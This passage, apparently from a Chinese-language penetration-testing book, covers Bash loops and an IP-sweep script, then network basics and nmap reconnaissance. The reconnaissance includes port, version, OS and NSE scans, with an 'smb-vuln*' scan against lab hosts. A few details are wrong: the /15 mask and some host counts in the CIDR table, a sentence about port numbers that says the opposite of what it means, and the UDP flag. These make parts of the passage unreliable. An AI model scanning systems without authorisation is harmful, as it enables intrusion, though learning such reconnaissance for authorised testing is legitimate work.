  \n#Bar\nBAR='##########'\n\nfor COUNTER in {1..10}\ndo\n### 从零索引开始打印进度条进度\necho\
  \ -ne \"\\r${BAR:0:$COUNTER}\"\n### 休眠 1 秒\nsleep 1\ndone\n```\n\n### 文件迭代\n\n以下是你使用\
  \ `for` 循环在 Bash 中简单读取文本文件应该执行的操作：\n\n```bash\nfor line in $(cat filename)\ndo\n\
  do something\ndone\n```\n\n在接下来的示例中，我们将一个 IP 地址列表保存到名为 `ips.txt` 的文件中。然后，我们将重用之前创建的\
  \ Nmap ping 程序来检查每个 IP 地址是否在线。此外，我们还将检查每个 IP 地址的 DNS 名称：\n\n```bash\n#!//bin/bash\n\
  ### 从保存在文件中的 IP 列表中进行 Ping 并获取 DNS 名称\n\n### 提示用户输入 IP 地址文件名 / 路径。\nread -p \"Enter\
  \ the IP addresses file name / path:\" FILE_PATH_NAME\n\nfunction check_host(){\n\
  \        # 如果 IP 地址值不为空\n        if [[ -n $IP_ADDRESS ]]\n        then\n       \
  \         ping_cmd=$(nmap -sn $IP_ADDRESS| grep 'Host is up' | cut -d '(' -f 1)\n\
  \                echo '------------------------------------------------'\n     \
  \           if [[ -z $ping_cmd ]]\n                then\n                      \
  \  printf \"$IP_ADDRESS is down\\n\"\n                else\n                   \
  \     printf \"$IP_ADDRESS is up\\n\"\n                        dns_name\n      \
  \          fi\n        fi\n}\n\nfunction dns_name(){\n        dns_name=$(host $IP_ADDRESS)\n\
  \        printf \"$dns_name\\n\"\n}\n\n### 遍历文件中的 IP 地址\nfor ip in $(cat $FILE_PATH_NAME)\n\
  do\n        IP_ADDRESS=$ip\n        check_host\ndone\n```\n\n如果你仔细阅读了这一章，你应该能够理解在之前的代码中看到的所有内容。这个程序中唯一的区别在于我使用了\
  \ Tab 缩进来让脚本看起来更好。之前的示例涵盖了我们到为止所做的大部分内容，包括：\n\n* 用户输入\n* 声明变量\n* 使用函数\n* 使用 `if`\
  \ 条件判断\n* 循环迭代\n* 打印到屏幕\n\n### 总结\n\n我希望你练习了本章中所有的练习，特别是如果你是编程初学者。提到的许多概念将适用于许多编程语言，因此请将这些练习视为学习基础的机会。\n\
  \n我个人使用 Bash 脚本来处理小型和快速的场景。如果你想构建更复杂的应用程序，可以尝试用 Python 来完成。别担心！你会在本书的末尾学习 Python，以便你可以在渗透测试员的职业生涯中应对任何想要的情况。\n\
  \n最后，这一章涵盖了许多关于 Bash 脚本的信息。然而，信息比本章的内容要多得多。在实践中，我使用网络搜索引擎来快速查找 Bash 脚本参考。事实上，你不需要记住在本章中学到的所有内容。记住，这本书是可以信赖的参考，用来记住各种情况下使用的语法。\n\
  \n# 第 3 章：网络主机扫描\n\n这一章是你进入渗透测试工作流的第一步。无论你是高手还是新手，这一章都将帮助你成功进行网络扫描。在开始之前，我们将介绍在扫描网络之前需要了解的基础。之后，我们将深入研究如何扫描网络目标。\n\
  \n本章涵盖了：\n\n* 网络基础\n* 识别活动主机\n* 端口扫描\n* 服务枚举\n* 操作系统指纹\n* Nmap 脚本引擎\n* 子域名扫描\n\n\
  ## 网络基础\n\n在开始扫描和识别主机之前，你首先需要理解网络基础。例如，我们为什么要使用 10.0.0.1/16？或者什么是 TCP 握手？让我们开始吧！\n\
  \n### 网络协议\n\n以下是你成功扫描网络时需要注意的两种网络协议。\n\n#### TCP\n\n传输控制协议（TCP）是网络基础设施中使用的主要协议。每个应用程序服务器（HTTP、FTP、SMTP\
  \ 等）都使用此协议来正确连接客户端与服务器。\n\nTCP 使用一种名为 `三次握手` 的概念来建立网络连接。首先，为了启动 TCP 会话，客户端向服务器发送一个\
  \ `SYN` 数据包（同步）。服务器接收到 `SYN` 并向客户端返回同步/确认（SYN/ACK）。\n\n例如，图 3.1 显示了 Bob 先生通过访问 `Google.com`\
  \ 浏览网页（客户端）的场景。\n\n```\n（TCP 握手截图）\n```\n\n#### UDP\n\n用户数据报协议（UDP）是一种`无连接`的网络连接。与\
  \ TCP 连接相反，UDP 客户端和服务器不会保证数据包传输，因此 UDP 中没有三次握手。使用 UDP 的应用示例是音频和视频流——在这些连接中你追求性能。\n\
  \n#### 其他网络协议\n\nTCP 和 UDP 是最流行的网络协议，但也存在其他类型的协议。在本节中，我们将涵盖其余协议。\n\n##### ICMP\n\
  \n互联网控制消息协议（ICMP）用于测试连通性。`Ping` 工具使用此协议来测试主机网络是否运行（`traceroute` 默认也会使用它）。在接下来的示例中，我们将\
  \ ping IP 地址 10.0.20.1 并从 Wireshark 中检查 ICMP 连接：\n\n\n\n\n\n```\n root@kali:~# ping\
  \ 10.0.0.1 -c 3\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1:\
  \ icmp_seq=1 ttl=64 time=0.706 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.725\
  \ ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.506 ms\n\n--- 10.0.0.1 ping\
  \ statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2033ms\n\
  rtt min/avg/max/mdev = 0.506/0.645/0.725/0.099 ms\n```\n\n图 3.4 显示了应用 `icmp` 过滤器的\
  \ Wireshark：\n\n![Wireshark ICMP 过滤器快照](img/c03f004.png)\n\n图 3.4 Wireshark ICMP\
  \ 过滤器\n\n## ARP\n\n地址解析协议（ARP）是一种将 IPv4 地址映射到 MAC 地址的机制。这一概念对于内部网络的运行至关重要。路由器在互联网上通过\
  \ IP 地址（第 3 层）相互连接，但一旦数据包进入你的网络，就会使用 MAC 地址（第 2 层）的 ARP 表。你可以使用 `arp -a` 命令来获取 ARP\
  \ 表中的项目列表（保存在你的本地主机上）：\n\n```\n root@kali:~# arp -a\n? (10.0.0.10) at 70:5a:0f:f6:fc:3a\
  \ [ether] on eth0\nUSGPRO (10.0.0.1) at b4:fb:e4:2f:04:3d [ether] on eth0\n```\n\
  \n这些层指的是之前展示的 OSI 层（参见表 3.1）。开放系统互连（OSI）将网络连接分为不同的层。\n\n| 序号 | 名称 | 协议示例 | 设备示例\
  \ |\n| --- | --- | --- | --- |\n| 1 | 物理层 | 以太网等. | 线缆 |\n| 2 | 数据链路层 | MAC, VLAN\
  \ 等. | 交换机 |\n| 3 | 网络层 | IPv4/v6 ICMP 等. | 路由器 |\n| 4 | 传输层 | TCP UDP | 无 |\n|\
  \ 5 | 会话层 | 无 | 无 |\n| 6 | 表示层 | 无 | 无 |\n| 7 | 应用层 | FTP, HTTP, Telnet 等. | 防火墙、代理服务器等.\
  \ |\n\n表 3.1 OSI 层\n\n### IP 地址\n\n网际协议（IP）是网络的主要支柱之一，使计算机能够相互通信。IP 地址分为两个版本：IPv4\
  \ 和 IPv6。\n\n#### IPv4\n\nIPv4 是 32 ，但始终以十进制格式呈现，例如 `192.168.0.1`，它等于 `11000000.10101000.00000000.00000001`。用十进制格式写比二进制更简单，对吧？\n\
  \nIP 地址分为公共地址（用于互联网）和私有地址（用于内网）。除非你购买了静态公 IP，否则你的公 IP 地址可能是由互联网服务提供商（ISP）自动提供的。\n\
  \n以下是私有 IPv4 地址范围：\n\n*   10.0.0.0 到 10.255.255.255 (`10.x.x.x`)），约有 1600 万地址\n\
  *   172.16.0.0 到 172.31.255.255 (`172.16.x.x` 到 `172.31.x.x`），约有 100 万地址\n*   192.168.0.0\
  \ 到 192.168.255.255 (`192.168.x.x`)），约有 65,000 个地址\n\n#### 子网与 CIDR\n\n子网的作用是将网络划分为更小的范围（网络分段）。子网会识别\
  \ IP 范围内的主机数量。例如，`192.168.0.1` 可以拥有子网掩码 `255.255.255.0`，这意味着我们可以在这个 IP 范围内使用 254\
  \ 个主机。无类域间路由（CIDR）的创建是为了简化子网掩码。以上例子，我们可以编写 `/24`（CIDR 等效写法）代替长掩码。表 3.2 列出了你可以作为参考的子网和网络掩码。\n\
  \n| CIDR | 网络掩码 | 主机数量 |\n| --- | --- | --- |\n| /30 | 255.255.255.252 | 2 |\n|\
  \ /29 | 255.255.255.248 | 6 |\n| /28 | 255.255.255.240 | 14 |\n| /27 | 255.255.255.224\
  \ | 30 |\n| /26 | 255.255.255.192 | 62 |\n| /25 | 255.255.255.128 | 126 |\n| /24\
  \ | 255.255.255.0 | 254 |\n| /23 | 255.255.254.0 | 510 |\n| /22 | 255.255.252.0\
  \ | 1022 |\n| /21 | 255.255.248.0 | 2046 |\n| /20 | 255.255.240.0 | 4094 |\n| /19\
  \ | 255.255.224.0 | 8190 |\n| /18 | 255.255.192.0 | 16382 |\n| /17 | 255.255.128.0\
  \ | 32766 |\n| /16 | 255.255.0.0 | 65534 |\n| /15 | 255.255.254.0 | 131070 |\n|\
  \ /14 | 255.252.0.0 | 262142 |\n| /13 | 255.248.0.0 | 524286 |\n| /12 | 255.240.0.0\
  \ | 1048574 |\n| /11 | 255.224.0.0 | 2097150 |\n| /10 | 255.192.0.0 | 4194302 |\n\
  | /9 | 255.128.0.0 | 8288606 |\n| /8 | 255.0.0.0 | 16777216 |\n\n表 3.2 子网与 CIDR\n\
  \n#### IPv6\n\n到目前，我们仍然大量使用 IPv4 来运行网络。由于 IPv4 地址将耗尽，已经多次尝试从 IPv4 转换为 IPv6。你至少需要理解\
  \ IPv6 在实践是如何工作的。\n\nIPv6 格式是 128 位十六进制字符。这是一个价值万亿字的 IPv6 示例：\n\n*   `fff0:0000:eeee:0000:0000:0000:fe77:03aa`\n\
  \n我们将使用这个示例来看 IPv6 格式的工作原理。\n\n1.  首先遵循 IPv6 规范，我们需要删除前导零。\n    之前：`fff0:0000:eeee:0000:0000:0000:fe77:03aa`\n\
  \    之后：`fff0:0:eeee:0:0:0:fe77:03aa`\n2.  压缩零序列（在我们的案例中，有三组零）并将它们替换为 `::`。\n  \
  \  之前：`fff0:0:eeee:0:0:0:fe77:03aa`\n    之后：`fff0:0:eeee::fe77:3aa`\n\n注意在 IPv6\
  \ 中，你只能压缩一次零序列。\n\n#### 端口号\n\n端口号和 IP 地址就像兄弟姐妹。没有端口号，网络包将永远到达目的地。端口号就像门牌号。街道名（IP\
  \ 地址）不足以到达某处物业；你需要一个门牌号（端口号）才能拥有完整的地址。\n\n想象一下你正在使用浏览器访问 [`www.google.com`](http://www.google.com)\
  \ 。你的数据包需要 Web 服务器主机的 IP 地址和端口号，默认情况下 HTTPS 为 `443`。在同一台服务器上（具有相同的 IP 地址），Google\
  \ 可能托管其他服务，例如 FTP；那时数据包将使用端口 `21` 来访问它。\n\n表 3.3 列出了你在扫描网络时需要的最常见的默认端口号。注意端口号范围从\
  \ 1 到 65,535。\n\n| 协议名称 | 端口号 | 协议名称 | 端口号 |\n| --- | --- | --- | --- |\n| FTP |\
  \ TCP 21 | LDAP over SSL | TCP 636 |\n| SSH/SCP | TCP 22 | FTP over SSL | TCP 989–990\
  \ |\n| Telnet | TCP 23 | IMAP over SSL | TCP 993 |\n| SMTP | TCP 25 | POP3 over\
  \ SSL | TCP 995 |\n| DNS 查询 | UDP 53 | MS-SQL | TCP 1433 |\n| DNS 区域传输 | TCP 53\
  \ | NFS | TCP 2049 |\n| DHCP | UDP 67 UDP 68 | Docker Daemon | TCP 2375 |\n| TFTP\
  \ | UDP 69 | Oracle DB | TCP 2484 |\n| HTTP | TCP 80 | MySQL | TCP 3306 |\n| Kerberos\
  \ | UDP 88 | RDP | TCP 3389 |\n| POP3 | TCP 110 | VNC | TCP 5500 |\n| SNMP | UDP\
  \ 161 UDP 162 | PCAnywhere | TCP 5631 |\n| NetBIOS | TCP/UDP 137 TCP/UDP 138 TCP/UDP\
  \ 139 | IRC | TCP 6665–6669 |\n| IMAP | TCP 143 | IRC SSL | TCP 6679 TCP 6697 |\n\
  | LDAP | TCP 389 | BitTorrent | TCP 6881–6999 |\n| HTTPS (TLS) | TCP 443 | Printers\
  \ | TCP 9100 |\n| SMTP over SSL | TCP 465 | WebDAV | TCP 9800 |\n| | | Webmin |\
  \ 10000 |\n\n\n\n\n\n当你执行 `ping` 命令时，你的 Kali 宿主机将向目标发送一个 ICMP 回显请求（echo request），随后目标将返回一个\
  \ ICMP 回显包（echo reply）。因此，你可以认为目标是活的。`ping` 命令对系统管理员很有用，但我们是精英，对吧？稍后，你将看到为什么必须使用\
  \ `Nmap` 来扫描存活主机。最后，你需要意识到某些系统管理员会在防火墙层级关闭 ICMP 回显，以阻止黑客检查某些服务器的连通性。\n\n## ARP\n\
  \n地址解析协议（Address Resolution Protocol）是一项极佳工具工具它可以将局域网中的 IP 地址映射到物理 MAC 地址。\n\n现在，我们可以利用\
  \ ARP 表的内容，在 Kali 上使用 `arp-scan` 命令列出同一网络上的所有主机：\n\n```bash\nroot@kali:~# arp-scan\
  \ 10.0.0.1/24\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:40:e7:a6, IPv4: 10.0.0.20\n\
  WARNING: host part of 10.0.0.1/24 is non-zero\nStarting arp-scan 1.9.7 with 256\
  \ hosts (https://github.com/royhills/arp-scan)\n10.0.0.1      b4:fb:e4:2f:04:3d\
  \     Ubiquiti Networks Inc.\n10.0.0.2      fc:ec:da:d4:d5:99     Ubiquiti Networks\
  \ Inc.\n10.0.0.5      b4:fb:e4:1b:c4:d2     Ubiquiti Networks Inc.\n10.0.0.10  \
  \   70:5a:0f:f6:fc:3a     Hewlett Packard\n10.0.0.50     00:11:32:94:25:4c     Synology\
  \ Incorporated\n10.0.0.75     fc:ec:da:d8:24:07     Ubiquiti Networks Inc.\n10.0.0.102\
  \    d0:2b:20:95:3b:96     Apple, Inc.\n```\n\n#### Nmap\n\n现在是时候向你展示我用来识别存活主机的喜爱工具：`Nmap`。你需要使用以下命令选项来完成任务：\n\
  \n```bash\n$nmap -sn [IP Address / Range]\n```\n\n为了帮助你记忆，可以将选项 `-sN` 想象成 Sam 和\
  \ `N` 是 Nanny（保姆）。这些选项的真实含义如下：\n\n* `n` 代表 No.（不）。\n* `s` 代表 Scan（扫描）。\n\n这就是为什么该选项的名字是无端口扫描（No\
  \ Port Scan）。有些人称其为 Ping 扫描（Ping Scan），但不要把它与我们在在本章之前讨论过的 ICMP Ping 工具混淆。话虽如此，让我们来看看为什么这个选项是如此神奇的。为了识别存活主机，`Nmap`\
  \ 会尝试执行以下操作：\n\n1. 它将发送一个 ICMP 回显请求，如果 ICMP 被拦截，`Nmap` 也不会放弃。\n2. 同时，它还会发送一个 ICMP\
  \ 时间戳请求（timestamp request）。\n3. 它将向端口 80 发送一个 `ACK` 包，向端口 443 发送一个 `SYN` 包。\n4.\
  \ 最后，它将发送一个 `ARP` 请求。\n\n它非常强大，对吧？重要的是，你需要在你的 Kali 机器上拥有 root 权限（或 `sudo` 组的成员），否则你的选项将受到限制，你无法执行所有这些功能。让我们让\
  \ Sam 和 Nanny 动起来：\n\n```bash\nroot@kali:~# nmap -sn 10.0.0.1/24\nStarting Nmap\
  \ 7.80 ( https://nmap.org ) at 2020-10-05 09:25 EDT\nNmap scan report for USGPRO\
  \ (10.0.0.1)\nHost is up (0.00036s latency).\nMAC Address: B4:FB:E4:2F:04:3D (Ubiquiti\
  \ Networks)\nNmap scan report for unifi (10.0.0.2)\nHost is up (0.00027s latency).\n\
  MAC Address: FC:EC:DA:D4:D5:99 (Ubiquiti Networks)\nNmap scan report for 10.0.0.5\n\
  Host is up (0.0024s latency).\nMAC Address: B4:FB:E4:1B:C4:D2 (Ubiquiti Networks)\n\
  Nmap scan report for 10.0.0.10\nHost is up (0.0081s latency).\nMAC Address: 70:5A:0F:F6:FC:3A\
  \ (Hewlett Packard)\nNmap scan report for 10.0.0.50\nHost is up (0.00066s latency).\n\
  MAC Address: 00:11:32:94:25:4C (Synology Incorporated)\n```\n\n### 端口扫描与服务枚举\n\n\
  在网络扫描期间，你会被要求执行的任务之一查找每个主机上的开放端口。为什么？假设你想知道所有的 Web 服务器。为了让你获取局域网（LAN）中的所有开放端口，看看\
  \ `Nmap` 是如何处理任务的。\n\n#### TCP SYN 端口扫描\n\n有些选项称其为隐身扫描（stealth scan），`Nmap` 默认执行此操作。\n\
  \n```bash\n$nmap -sS [IP Address / Range]\n```\n\n为了记忆，可以将 `sS` 选项与 Sam 联系起来。如果你想知道哪些端口是开放的，可以使用\
  \ Sam。`sS` 选项代表 `SYN` 扫描，如果你叫 Sam 是幸运的。让我向你解释 `Nmap` 是如何工作的。扫描器带有 `sS` 选项向服务器发送\
  \ `SYN` 请求，如果在响应中收到了 `SYN/ACK`，则该端口是开放的。如果扫描器没有收到，则端口是关闭的。\n\n```bash\nroot@kali:~#\
  \ nmap -sS 10.0.0.1/24\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 09:25\
  \ EDT\nNmap scan report for USGPRO (10.0.0.1)\nHost is up (0.00036s latency).\n\
  MAC Address: B4:FB:E4:2F:04:3D (Ubiquiti Networks)\nNmap scan report for unifi (10.0.0.2)\n\
  Host is up (0.00027s latency).\nMAC Address: FC:EC:DA:D4:D5:99 (Ubiquiti Networks)\n\
  Nmap scan report for 10.0.0.5\nHost is up (0.0024s latency).\nMAC Address: B4:FB:E4:1B:C4:D2\
  \ (Ubiquiti Networks)\nNmap scan report for 10.0.0.10\nHost is up (0.0081s latency).\n\
  MAC Address: 70:5A:0F:F6:FC:3A (Hewlett Packard)\nNmap scan report for 10.0.0.50\n\
  Host is up (0.00066s latency).\nMAC Address: 00:11:32:94:25:4C (Synology Incorporated)\n\
  ```\n\n#### UDP\n\n那么，UDP 呢？UDP 是无连接的，因此扫描速度比 TCP 慢。要扫描 UDP 端口，使用 `-U` 选项：\n\n```bash\n\
  $nmap -sU [IP Address / Range]\n```\n\n要注意，如果端口是开放的，`Nmap` 可能接收不到任何响应，使其显示为 `open|`。如果端口是关闭的，你可能会收到一个\
  \ ICMP 端口不可达（port unreachable）消息。如果防火墙过滤了数据包，它将显示为 `filtered`。\n\n\n\n\n最后，如果你想包含所有端口，可以使用\
  \ `-p-`（你也可以使用 `-p 1-65535`）来扫描每一个端口（扫描所有端口号将发现任何隐藏的应用程序）。我从不对 UDP 使用此选项（因为太慢了），但在进行\
  \ TCP 扫描时我经常使用它（在接下来的命令中，我们没有指定 `-sS` 选项，因为它是默认开启的）：\n\n```\nroot@kali:~# nmap -p-\
  \ -T5 10.0.0.1\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 09:35 EDT\n\
  Nmap scan report for USGPRO (10.0.0.1)\nHost is up (0.00097s latency).\nNot shown:\
  \ 65531 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n53/tcp  open  domain\n\
  80/tcp  open  http\n443/tcp open  https\nMAC Address: B4:FB:E4:2F:04:3D (Ubiquiti\
  \ Networks)\n\nNmap done: 1 IP address (1 host up) scanned in 9.91 seconds\n```\n\
  \n### 服务枚举\n\n现在是时候看看如何使用最好的扫描器 Nmap 来执行服务版本扫描了。在 Nmap 中进行版本扫描的选项是 `-sV`。通常，记忆 Nmap\
  \ 命令选项的一种极好方法是给每个字母赋予一个含义。例如，`s` 代表 *scan*（扫描），而 `V` 代表 *version*（版本）。很简单，对吧？这就是为什么它被称为*版本扫描*。请注意，版本扫描将比普通的端口扫描花费更长时间，因为它会尝试识别服务类型。在接下来的示例中，我们将扫描之前使用的同一个主机，但这次我们添加了\
  \ `-sV` 选项（查看版本列）：\n\n```\nroot@kali:~# nmap -p- -T5 -sV 10.0.0.1\nStarting Nmap\
  \ 7.80 ( https://nmap.org ) at 2020-10-05 09:36 EDT\nNmap scan report for USGPRO\
  \ (10.0.0.1)\nHost is up (0.00097s latency).\nNot shown: 65531 closed ports\nPORT\
  \    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 6.6.1p1 Debian 4~bpo70+1\
  \ (protocol 2.0)\n53/tcp  open  domain   dnsmasq 2.78-23-g9e09429\n\n80/tcp  open\
  \  http     lighttpd\n443/tcp open  ssl/http Ubiquiti Edge router httpd\nMAC Address:\
  \ B4:FB:E4:2F:04:3D (Ubiquiti Networks)\nService Info: OS: Linux; Device: router;\
  \ CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any\
  \ incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host\
  \ up) scanned in 25.88 seconds\n```\n\n这里有一个让版本扫描更快的的小技巧。准备好了吗？既然我们之前已经扫描过开放端口，就不需要再次使用\
  \ `-p-` 扫描所有端口了。相反，我们只需要指定之前在端口扫描中识别出的端口号（对比一下和之前版本扫描的速度；时间减少了一半！）：\n\n```\nroot@kali:~#\
  \ nmap -p 22,53,80,443 -T5 -sV 10.0.0.1\nStarting Nmap 7.80 ( https://nmap.org )\
  \ at 2020-10-05 09:39 EDT\nNmap scan report for USGPRO (10.0.0.1)\nHost is up (0.00092s\
  \ latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 6.6.1p1\
  \ Debian 4~bpo70+1 (protocol 2.0)\n53/tcp  open  domain   dnsmasq 2.78-23-g9e09429\n\
  80/tcp  open  http     lighttpd\n443/tcp open  ssl/http Ubiquiti Edge router httpd\n\
  MAC Address: B4:FB:E4:2F:04:3D (Ubiquiti Networks)\nService Info: OS: Linux; Device:\
  \ router; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please\
  \ report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address\
  \ (1 host up) scanned in 13.63 seconds\n```\n\n最后，你可以更改版本扫描的激进程度。换句话说，你希望 Nmap 多深地去扫描每个服务的版本？强度越高，扫描目标主机花费的时间越长。表\
  \ 3.4 总结了版本强度选项：\n\n| NMAP 选项 | 说明 |\n| --- | --- |\n| `-version-intensity 0-9`\
  \ | 9 是最高强度，默认值是 7。 |\n| `-version-light` | 等同于 `-version-intensity 2`。 |\n| `-version-all`\
  \ | 等同于 `-version-intensity 9`。 |\n\n在下面的示例中，我们将使用 `-version-light` 让扫描速度更快：\n\n\
  ```\nroot@kali:~# nmap -p 22,53,80,443 -T5 -version-light 10.0.0.1\nStarting Nmap\
  \ 7.80 ( https://nmap.org ) at 2020-10-05 09:41 EDT\nNmap scan report for USGPRO\
  \ (10.0.0.1)\nHost is up (0.00097s latency).\n\nPORT    STATE SERVICE  VERSION\n\
  22/tcp  open  ssh      OpenSSH 6.6.1p1 Debian 4~bpo70+1 (protocol 2.0)\n53/tcp \
  \ open  domain   dnsmasq 2.78-23-g9e09429\n80/tcp  open  http     lighttpd\n443/tcp\
  \ open  ssl/http Ubiquiti Edge router httpd\nMAC Address: B4:FB:E4:2F:04:3D (Ubiquiti\
  \ Networks)\nService Info: OS: Linux; Device: router; CPE: cpe:/o:linux:linux_kernel\n\
  \nService detection performed. Please report any incorrect results at https://nmap.org/submit/\
  \ .\nNmap done: 1 IP address (1 host up) scanned in 12.60 seconds\n```\n\n### 操作系统指纹\n\
  \n想象一个场景，你的客户来到你这里说：“我们需要知道操作系统。”你微笑说：“我们可以通过 `-O` 选项来做到。”在接下来的示例中，Nmap 将通过检查接收到的包来识别目标操作系统。注意，操作系统扫描会比普通的端口扫描花费更多时间，例如：\n\
  \n```\nroot@kali:~# nmap -p 22,53,80,443 -T4 -O 10.0.0.1\nStarting Nmap 7.80 ( https://nmap.org\
  \ ) at 2020-10-05 09:45 EDT\nNmap scan report for USGPRO (10.0.0.1)\nHost is up\
  \ (0.00097s latency).\nDevice type: general purpose\nRunning: Linux\nOS CPE: cpe:/o:linux\n\
  \nOS details: Linux 2.6.x - 5.x\nNetwork Distance: 1 hop\nService Info: Host: USGPRO;\
  \ OS: Linux; CPE: cpe:/o:linux\n\nOS and Service detection performed. Please report\
  \ any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1\
  \ host up) scanned in 66.00 seconds\n```\n\n### Nmap 脚本引擎\n\nNmap 脚本引擎 (NSE) 包含了一系列额外的功能（如暴力破解、DNS\
  \ 枚举、HTTP 枚举等），让 Nmap 运行如如牛似。Nmap 团队将所有这些功能分为不同的组，如下所示：\n\n- Auth（认证）\n- Broadcast（广播）\n\
  - Default（默认）\n- Discovery（发现）\n- DOS（拒绝服务）\n- Exploit（利用）\n- External（外部）\n- Fuzzer（模糊测试）\n\
  - Intrusive（侵入性）\n- Malware（恶意软件）\n- Safe（安全）\n- Version（版本）\n- Vuln（漏洞）\n\n要获取所有\
  \ NSE 脚本的列表，只需列出目录 `/usr/share/nmap/scripts` 的内容：\n\n\n\n\n\n```\nroot@kali:~# ls\
  \ /usr/share/nmap/scripts/\nacarsd-info.nse                   http-hp-ilo-info.nse\n\
  nping-brute.nse\naddress-info.nse                  http-huawei-hg5xx-vuln.nse\n\
  nrpe-enum.nse\nafp-brute.nse                     http-icloud-findmyiphone.nse\n\
  ntp-info.nse\nafp-ls.nse                        http-icloud-sendmsg.nse\nntp-monlist.nse\n\
  afp-path-vuln.nse                 http-iis-short-name-brute.nse\nomp2-brute.nse\n\
  afp-serverinfo.nse                http-iis-webdav-vuln.nse\nomp2-enum-targets.nse\n\
  afp-showmount.nse                 http-internal-ip-disclosure.nse\nomron-info.nse\n\
  ajp-auth.nse                      http-joomla-brute.nse\nopenlookup-info.nse\najp-brute.nse\
  \                     http-jsonp-detection.nse\nopenvas-otp-brute.nse\najp-headers.nse\
  \                   http-litespeed-sourcecode-download.nse\nopenwebnet-discovery.nse\n\
  ajp-methods.nse                   http-ls.nse\noracle-brute.nse\najp-request.nse\
  \                   http-majordomo2-dir-traversal.nse\noracle-brute-stealth.nse\n\
  allseeingeye-info.nse             http-malware-host.nse\noracle-enum-users.nse\n\
  amqp-info.nse                     http-mcmp.nse\noracle-sid-brute.nse\n[...]\n```\n\
  \n一个常见的例子是 HTTP 枚举，为此目的存在一个 NSE 脚本。为了完成任务，我们首先需要指定目标目标的端口号，此外，我们还会添加版本扫描（这是可选的，但我建议这样做）以获取更详尽的信息：\n\
  \n```\n $nmap -p [port number] -sV –script [NSE script name] [IP address / range]\n\
  root@kali:~# nmap -sV -p 80 --script http-enum 10.0.0.1\nStarting Nmap 7.80 ( https://nmap.org\
  \ ) at 2020-10-05 09:51 EDT\n\nNmap scan report for USGPRO (10.0.0.1)\nHost is up\
  \ (0.00082s latency).\n\nPORT STATE SERVICE VERSION\n80/tcp open http lighttpd\n\
  |_http-server-header: Server\n|_https-redirect: ERROR: Script execution failed (use\
  \ -d to debug)\nMAC Address: B4:FB:E4:2F:04:3D (Ubiquiti Networks)\n\nService detection\
  \ performed. Please report any incorrect results at https://nmap.org/submit/ .\n\
  Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds\n```\n\n## NSE 类别扫描\n\
  \n当你使用类别扫描时，不需要指定端口号，因为一个类别将针对多个端口号（所有开放的 TCP 端口）。在渗透测试中最常用的是默认脚本扫描 `-sC`。在继续进行示例之前，你需要了解它为什么这么受欢迎。默认脚本扫描的误报率较低（`false\
  \ positive` 意味着虚假漏洞），并且与其他类别相比，对目标系统的入侵性较小（某些类别可能会导致你的目标主机崩溃，例如 DOS 类别）：\n\n```\n\
  \ root@kali:~# nmap -sV -sC 10.0.0.1\nStarting Nmap 7.80 ( https://nmap.org ) at\
  \ 2020-10-05 09:52 EDT\nNmap scan report for USGPRO (10.0.0.1)\nHost is up (0.00059s\
  \ latency).\nNot shown: 996 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open\
  \ ssh OpenSSH 6.6.1p1 Debian 4~bpo70+1 (protocol 2.0)\n| ssh-hostkey: \n|  1024\
  \ 40:a1:21:7f:53:fe:71:41:bb:54:5d:83:1d:44:dd:65 (DSA)\n|  2048 fa:08:a3:16:7c:3a:48:e3:7e:d6:ea:2c:6a:5d:15:93\
  \ (RSA)\n|  256 36:d5:77:3f:f8:6f:a0:36:07:30:7a:43:1f:4d:ac:b5 (ECDSA)\n|_ 256\
  \ 88:5a:3c:60:df:0a:dd:b2:2b:4e:a8:af:19:d7:f5:9e (ED25519)\n53/tcp open domain\
  \ dnsmasq 2.78-23-g9e09429\n| dns-nsid: \n|_ bind.version: dnsmasq-2.78-23-g9e09429\n\
  80/tcp open http lighttpd\n|_http-server-header: Server\n|_http-title: Did not follow\
  \ to https://usgpro/\n|_https-redirect: ERROR: Script execution failed (use -d to\
  \ debug)\n443/tcp open ssl/http Ubiquiti Edge httpd\n| http-cookie-flags: /\n| PHESSID:\
  \ \n|_ httponly not set\n|_http-server-header: Server\n|_http-title: UniFi Gateway\n\
  | ssl-cert: Subject: commonName=UbiquitiRouter/organization=Ubiquiti Inc./stateOr=New\
  \ York/countryName=US\n| Subject Alternative Name: DNS:UbiquitiUI\n| Not valid before:\
  \ 2020-03-11T01:02:25\n|_ valid after: 2022-06-13T01:02:25\n|_ssl-date: randomness\
  \ does not time\nMAC Address: B4:FB:E4:2F:04:3D (Ubiquiti Networks)\nService Info:\
  \ OS: Linux; Device: router; CPE: cpe:/o:linux_kernel\n\nService detection performed.\
  \ Please report any incorrect results at https://nmap.org/submit/ .\nNmap done:\
  \ 1 IP address (1 host up) scanned in 24 seconds\n```\n\n此外，你可以使用 `-A` 关来执行默认扫描，但请注意该选项将使用：\n\
  \n*   版本扫描\n*   Syn 扫描\n*   默认扫描\n*   traceroute\n\n```\n $nmap -A [IP address /\
  \ range]\n```\n\n针对同一类别中多个脚本的另一种方法是使用通配符 `*`。例如，针对所有 Samba 相关的脚本你需要使用以下命令。（注意此命令将花费很长时间。执行期间的任何时候都可以按\
  \ Enter 键查看进度。）\n\n```\n root@kali:~# nmap -sV -p 135,445 --script smb-vuln* 10.0.0.187\n\
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 09:54 EDT\nNmap scan report\
  \ for Win7Lab.ksec.local (10.0.0.187)\nHost is up (0.00027s latency).\n\nPORT STATE\
  \ SERVICE VERSION\n135/tcp open msrpc Microsoft RPC\n445/tcp open microsoft-ds Microsoft\
